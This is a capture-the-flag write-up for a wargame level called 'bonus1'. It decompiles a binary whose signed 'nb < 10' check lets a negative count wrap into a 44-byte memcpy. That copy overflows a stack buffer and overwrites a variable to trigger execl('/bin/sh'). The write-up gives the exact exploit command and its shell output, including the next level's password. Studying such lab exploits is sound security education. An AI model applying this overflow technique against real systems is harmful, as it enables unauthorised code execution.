# bonus1

### Decompilation

We analyze the binary using Ghidra. The entire vulnerability is contained within the `main` function:

```c
int main(int ac, char **av) {
    int nb;
    char str[40];
    nb = atoi(av[1]);
    if (nb < 10) {
        memcpy(str, av[2], nb * 4);
        if (nb == 0x574f4c46) { // "FLOW" in ASCII
            execl("/bin/sh", "sh", NULL);
        }
        return 0;
    }
    return 1;
}
```

The program parses `argv[1]` using `atoi` and stores the result in a signed integer `nb`. If `nb` is less than 10, it copies `nb * 4` bytes from `argv[2]` into a 40-byte local buffer `str`. After the copy, it checks if `nb` equals `0x574f4c46`. If it does, the program executes `/bin/sh`.

The corresponding assembly instructions show where these local variables are stored relative to `esp`:
```assembly
0x08048438 <+20>: call   0x8048360 <atoi@plt>
0x0804843d <+25>: mov    DWORD PTR [esp+0x3c],eax     ; nb
0x08048441 <+29>: cmp    DWORD PTR [esp+0x3c],0x9
...
0x0804844f <+43>: mov    eax,DWORD PTR [esp+0x3c]
0x08048453 <+47>: lea    ecx,[eax*4+0x0]              ; nb * 4
...
0x08048464 <+64>: lea    eax,[esp+0x14]               ; str buffer
...
0x08048473 <+79>: call   0x8048320 <memcpy@plt>
0x08048478 <+84>: cmp    DWORD PTR [esp+0x3c],0x574f4c46
...
0x08048499 <+117>: call   0x8048350 <execl@plt>
```

### Vulnerability Identification

1. The destination of the copy operation is a 40-byte stack buffer `str` at `esp + 0x14`.
2. The number of bytes copied is calculated as `nb * 4` and passed as the third parameter (`size_t` / unsigned) to `memcpy`.
3. The comparison `nb < 10` is a **signed** comparison. Therefore, passing a negative number will satisfy the condition.
4. The variable `nb` is stored at `esp + 0x3c`, which sits exactly 40 bytes after the start of `str`. By overflowing the `str` buffer, we can overwrite `nb` with `0x574f4c46` (little-endian: `\x46\x4c\x4f\x57`).

### Locating the Local Variables

We set a breakpoint immediately after `memcpy` at `0x08048478` in GDB and run with arguments `3 AAAA`:
- The stack pointer `esp` is `0xbffff6f0`.
- The address of `str` is `esp + 0x14 = 0xbffff704`.
- The address of `nb` is `esp + 0x3c = 0xbffff72c`.

The distance between the start of the `str` buffer and the `nb` variable is:
`0xbffff72c - 0xbffff704 = 40` bytes.

Thus, we need exactly 40 bytes of padding followed by `\x46\x4c\x4f\x57` to overwrite `nb` with the target value.

### Integer Overflow in the Copy Length

The largest positive value we can pass to satisfy the check is `9`, which copies:
`9 * 4 = 36` bytes. This is not enough to reach and overwrite `nb`.

However, if we pass a negative number, the third parameter of `memcpy` (which is unsigned) is treated as a very large positive number. For example, `-1` becomes `4,294,967,292` bytes, leading to a segmentation fault.

We must find a negative integer `n` that, when multiplied by 4, wraps around a 32-bit register to yield exactly `44` (40 bytes of padding + 4 bytes of target value):
`n * 4 ≡ 44 mod 2^32`

Dividing by 4:
`n ≡ 11 mod 2^30`

Selecting the negative representative:
`n = 11 - 2^30 = -1073741813`

In 32-bit arithmetic:
`-1073741813 * 4 = -4294967252 = 44` after integer wraparound.

This value is less than 10 (satisfying the signed check), but `memcpy` receives a size parameter of exactly `44`.

### Exploit Execution

We run the binary, passing `-1073741813` as the first argument, and 40 bytes of padding followed by `\x46\x4c\x4f\x57` as the second argument:
```bash
./bonus1 -1073741813 "$(python -c 'print "A"*40 + "\x46\x4c\x4f\x57"')"
```

This overwrites `nb` with `0x574f4c46`, triggering `execl` and spawning a shell:
```bash
$ whoami
bonus2
$ cat /home/user/bonus2/.pass
579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
```
